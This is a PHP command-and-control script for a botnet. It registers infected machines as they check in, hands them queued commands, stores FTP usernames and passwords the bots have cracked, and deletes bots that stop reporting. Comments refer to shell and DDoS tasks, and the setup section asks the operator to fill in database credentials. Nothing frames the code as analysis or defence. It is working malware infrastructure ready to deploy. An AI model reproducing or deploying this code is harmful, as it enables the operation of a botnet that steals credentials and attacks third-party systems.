<?php
//Error_Reporting(0); 
// that whole script will manage bots, it will add bots, update bots and automaticaly delete 
// outdated bots 



/*******************************************************************/
/************YOU HAVE TO EDIT THIS!!!!!!!!**************************/
/*******************************************************************/
$host = "localhost"; //database host  
$user = "root"; //database user  
$pass = "toor"; //password for database 
$db = "hybrid"; // databse name 
/*******************************************************************/
/************YOU HAVE TO EDIT THIS!!!!!!!!**************************/
/*******************************************************************/





global $table;
$table = "bots"; 
global $ftp_table;
$ftp_table = "ftp_table";
$conn = mysql_connect($host, $user, $pass) or die ("Unable to connect to database.");
$select = mysql_select_db($db);
if($select == FALSE){ 
		die('cant select database');
	}

class Online { 

var $timeout = 600; // for how long we should store bot in DB(in sec)? edit this to match your needs
	function Online () { 
		$this->period = time(); 
		$this->ip = $this->getip();
		$this->name = $this->getname(); 
		$this->msg = $this->getmsg();
		$this->gcmd = $this->getgcmd(); 
		$this->manage();
		$this->delbot(); 
	}
	function getgcmd(){ // getting magic number 1
		$gcmd = $_GET['gcmd']; 
		return $gcmd;
	}
	function getip() { // getting bot's ip address 
		$ip = htmlspecialchars(addslashes(getenv("REMOTE_ADDR"))); 
		return $ip; 
	}
	function getname() {  // getting bot's name 
		$name = htmlspecialchars(addslashes($_GET['name'])); 
		return $name; 
	}	
	function getmsg() { // getting message from our bot
		$msg = htmlspecialchars(addslashes($_GET['msg'])); 
		return $msg; 
	}	
	function manage() { 
		if($this->gcmd == 1){ 
			global $table;
			$res=mysql_query("SELECT cmd FROM $table WHERE name='".$this->name."'");
				for ($i=0, $ROWS=mysql_num_rows($res); $i<$ROWS; $i++){
				$row=mysql_fetch_row($res); 
				for($j=0;$j<count($row);$j++) echo $row[$j];
			}
		if($row){ // bot already in database 
			$decry_msg = $this->msg;
			global $ftp_table;
			if(strstr($decry_msg, "ftpstatus")){ // if were cracking ftp account ..
				$temp = explode("!", $decry_msg );
				$cracked_ftp = $temp[1];
				$ftp_login = $temp[2];
				$ftp_pass = $temp[3];
				$ftp_status = $ftp_login."!".$ftp_pass;
				$STATUS = mysql_query("UPDATE $ftp_table SET result='$ftp_status' WHERE ip='$cracked_ftp'");
				if(!$STATUS){
					echo "ERROR: ". mysql_error();					
					}
				$result = $ftp_status; // update command to sleep to avoid cracking same shit one more time 
				$STATUS = mysql_query("UPDATE $table SET name='$this->name', cmd='sleep!6!', period='$this->period', msg='$result' WHERE ip='$this->ip'");				
				if(!$STATUS){
					echo "ERROR: ". mysql_error();					
					}
				} 
			   if(strstr($decry_msg, "Done")){ // something is done, shell, ddos, erte, etc
				$STATUS = mysql_query("UPDATE $table SET name='$this->name', cmd='sleep!6!', period='$this->period', msg='$this->msg' WHERE name='$this->name'");
				if(!$STATUS){
					echo "ERROR: ". mysql_error();					
					}
				} else { // were doing something else like sleeping for example... 
				$STATUS = mysql_query("UPDATE $table SET name='$this->name', period='$this->period', msg='$this->msg' WHERE name='$this->name'");
				if(!$STATUS){
					echo "ERROR: ". mysql_error();					
					}
				}
		} else { // bot is not in database 
		$STATUS = mysql_query("INSERT INTO $table (ip, name, cmd, period, msg) VALUES ('$this->ip', '$this->name', '', '$this->period', '$this->msg')");
				if(!$STATUS){
					echo "ERROR: ". mysql_error();					
					}
		}}
		}

	function delbot() { // delete outdated bot, probably dead one 
	global $table;
		$STATUS = mysql_query ("DELETE FROM $table WHERE period < ($this->period - $this->timeout)"); 
				if(!$STATUS){
					echo "ERROR: ". mysql_error();					
					}
	}
} 
$machines = new Online(); // execute whole script 
?>
